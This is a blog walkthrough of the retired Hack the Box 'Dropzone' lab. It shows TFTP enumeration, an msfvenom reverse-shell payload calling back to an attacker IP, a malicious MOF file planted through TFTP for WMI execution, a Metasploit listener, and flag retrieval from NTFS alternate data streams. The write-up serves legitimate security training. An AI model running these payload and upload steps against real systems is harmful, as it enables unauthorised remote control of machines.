@@ -1,0 +1,333 @@
+
+								
+																		Hack the Box: Dropzone Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on November 4, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another CTF challenge “Dropzone”. It is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.
+Level: Expert
+Task: To find user.txt and root.txt file
+Note: Since these labs are online available therefore they have a static IP. The IP of Dropzone is 10.10.10.90
+Walkthrough
+Let’s start off with our basic nmap command to find out the open ports and services.
+
+		
+		
+			
+			
+			
+			
+nmap -sU -T4 10.10.10.90
+			
+				
+					
+				
+					1
+				
+						nmap -sU -T4 10.10.10.90
+					
+				
+			
+		
+
+From the given below image, you can observe we found port 69 is open on the target system and running TFTP service.
+
+We connect to the target system using a TFTP client and find that we can upload and download the file. We get the “boot.ini” file to find the operating system running system on the target machine.
+
+		
+		
+			
+			
+			
+			
+tftp 10.10.10.90
+			
+				
+					
+				
+					1
+				
+						tftp 10.10.10.90
+					
+				
+			
+		
+
+We take a look at the boot.ini file and find that the target system is running “Windows XP”.
+
+		
+		
+			
+			
+			
+			
+cat boot.ini
+			
+				
+					
+				
+					1
+				
+						cat boot.ini
+					
+				
+			
+		
+
+
+We are unable to find any exploit for TFTP service. So we are going to use MOF file WMI exploitation to get a reverse shell of the target machine.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.4 lport=443 -f exe &gt; hack.exe
+			
+				
+					
+				
+					1
+				
+						msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.4 lport=443 -f exe &gt; hack.exe
+					
+				
+			
+		
+
+
+We have an MSF module called “wbemexec.rb” to generate MOF file (you can find the file here). We download the file and edit it to run our shellcode. You can download the modified code from here.
+
+We upload both the shell and the MOF file using TFTP.
+
+		
+		
+			
+			
+			
+			
+tftp&gt; binary
+tftp&gt; put hack.exe /WINDOWS/system32/hack.exe
+tftp&gt; put hack.mof /WINDOWS/system32/wbem/mof/hack.mof
+			
+				
+					
+				
+					123
+				
+						tftp&gt; binarytftp&gt; put hack.exe /WINDOWS/system32/hack.exetftp&gt; put hack.mof /WINDOWS/system32/wbem/mof/hack.mof
+					
+				
+			
+		
+
+ 
+We set up our listener before uploading both the files.
+
+		
+		
+			
+			
+			
+			
+msf &gt; use exploit/multi/handler
+msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) &gt; set lhost 10.10.14.4
+msf exploit(multi/handler) &gt; set lport 443
+msf exploit(multi/handler) &gt; run
+			
+				
+					
+				
+					12345
+				
+						msf &gt; use exploit/multi/handlermsf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set lhost 10.10.14.4msf exploit(multi/handler) &gt; set lport 443msf exploit(multi/handler) &gt; run
+					
+				
+			
+		
+
+As soon as we upload the MOF file and our payload we get a reverse shell. After getting the reverse shell we check for system information and find that we have spawned a shell as administrator.
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt; sysinfo
+meterpreter &gt; getuid
+			
+				
+					
+				
+					12
+				
+						meterpreter &gt; sysinfometerpreter &gt; getuid
+					
+				
+			
+		
+
+
+We go to “c:\Documents and Settings\Administrator\Desktop” and find a file called “root.txt”. We take a look at the content of the file and find that the flag is not present there.
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt; cd Administrator
+meterpreter &gt; ls
+meterpreter &gt; cd Desktop
+meterpreter &gt; ls
+meterpreter &gt; cat root.txt
+			
+				
+					
+				
+					12345
+				
+						meterpreter &gt; cd Administratormeterpreter &gt; lsmeterpreter &gt; cd Desktopmeterpreter &gt; lsmeterpreter &gt; cat root.txt
+					
+				
+			
+		
+
+ 
+We go to the “flags” directory and find a file called “2 for the price of 1!.txt” and find a hint that we have to use alternate data streams to find the flags. Alternate data streams are an attribute that can be found in the NTFS file system. They can also be used to hide data from users.
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt; cd flags
+meterpreter &gt; dir
+meterpreter &gt; cat "2 for the price of 1!.txt"
+			
+				
+					
+				
+					123
+				
+						meterpreter &gt; cd flagsmeterpreter &gt; dirmeterpreter &gt; cat "2 for the price of 1!.txt"
+					
+				
+			
+		
+
+We can use streams.exe from Sysinternals to examine Alternate Data Streams. (You can download the tool from here)
+We upload the streams.exe into the target machine. We spawn the shell and execute the file to find data streams in the current directory and find both user and root flag.
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt; upload /root/Downloads/Streams/streams.exe
+meterpreter &gt; shell
+streams -accepteula -s .
+			
+				
+					
+				
+					123
+				
+						meterpreter &gt; upload /root/Downloads/Streams/streams.exemeterpreter &gt; shellstreams -accepteula -s .
+					
+				
+			
+		
+
+
+Author: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
